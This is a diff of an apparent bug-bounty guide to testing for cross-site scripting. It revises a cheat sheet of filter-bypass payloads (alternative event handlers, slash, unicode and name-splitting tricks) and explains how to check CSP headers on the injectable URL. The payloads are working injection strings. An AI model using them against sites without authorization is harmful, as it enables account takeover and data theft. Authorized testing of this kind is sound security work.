@@ -69,7 +69,7 @@ done
 | `&quot;` but `<` raw | attribute-safe only. Tag injection works |
 | `\"` in a JS string | JS-escaped. Try breaking out with a newline or `</script>` |
 | payload absent entirely | filtered, or a WAF. Go to step 5 |
-| `<img src=x>` survives but `onerror` stripped | attribute allowlist. Try `onfocus`, `onpointerenter`, SVG |
+| `<img src=x>` survives but `onerror` stripped | handler-name allowlist. `onfocus` needs a *focusable* element, so it is dead on a bare img - use `<input autofocus onfocus=...>`, or `<img tabindex=1 autofocus onfocus=...>`. Interaction-free alternatives: `<details open ontoggle=...>`, `<svg><animate onbegin=...>`, `<img src=<a-real-image> onload=...>`. `onpointerenter` needs the victim to move a pointer, which triagers discount |
 
 **4. Walk the ladder for stored and DOM variants.**
 
@@ -93,12 +93,21 @@ done
 ```
 case:            <ImG sRc=x OnErRoR=alert(91234)>
 no parens:       <img src=x onerror=alert`91234`>
-no spaces:       <img/src=x/onerror=alert(91234)>
+no spaces:       <img/src="x"/onerror=alert(91234)> · <svg/onload=alert(91234)>
+                 (`/` separates the tag name or follows a *quoted* value. After an
+                 unquoted value it is swallowed into it: <img/src=x/onerror=alert(91234)>
+                 parses to the single attribute src="x/onerror=alert(91234)" and nothing runs)
 alt events:      onfocus autofocus · onpointerenter · onanimationstart · ontoggle (<details open>)
 alt tags:        <svg onload=> · <body onload=> · <details open ontoggle=> · <video><source onerror=>
 entity/encoding: &#106;avascript: · %253Cscript%253E (double URL)
-unicode:         <script> in a JS context
-comment split:   <img src=x o/**/nerror=alert(91234)>
+unicode:         \u003cimg src=x onerror=alert(91234)\u003e  in a JS/JSON sink
+                 that decodes before writing to innerHTML · \u0061lert(91234) for an
+                 escaped identifier in a JS context (valid JS - \u0061lert === alert)
+                 · full-width/overlong lookalikes against naive substring filters
+name split:      <img src=x onerror=window['al'+'ert'](91234)> · onerror=alert/**/(91234)
+                 (`/**/` is a comment in JS, not in HTML markup - inside a tag `/` ends the
+                 attribute name, so `o/**/nerror` yields the dead attributes `o`, `**`,
+                 `nerror` and no handler. Split the *value*, never the handler name)
 no alert:        <img src=x onerror=print()> · onerror=confirm(91234)
 CSP-friendly:    a whitelisted-CDN JSONP endpoint, or a DOM-clobbering gadget
 ```
@@ -122,8 +131,16 @@ console. Note the browser and version - `mXSS` and parser bugs are engine-specif
 **7. Check the CSP before claiming severity.**
 
 ```bash
-curl -skI "https://$H/" | grep -i content-security-policy
+curl -sk -D hdr.txt "https://$H/<vuln-path>" -o body.html   # a real GET of the *injectable* URL
+grep -i content-security-policy hdr.txt
+grep -io '<meta[^>]*Content-Security-Policy[^>]*>' body.html
 ```
+
+Do not use `-I`: it sends HEAD, and plenty of frameworks and CDNs emit security headers on GET
+only, or answer HEAD with a 405. CSP is per-response, so the policy on `/` is often not the
+policy on the injectable endpoint - a header-only check of the home page both invents and misses
+blocking policies. A SPA may ship its CSP as a `<meta http-equiv>` in the body, which no header
+check ever sees. And read `Content-Security-Policy-Report-Only` separately: it blocks nothing.
 
 A strict CSP (`script-src 'self'` with no `unsafe-inline`, no wildcard CDN) can reduce a real
 injection to a non-issue. Say so honestly - and then look for the CSP bypass, because
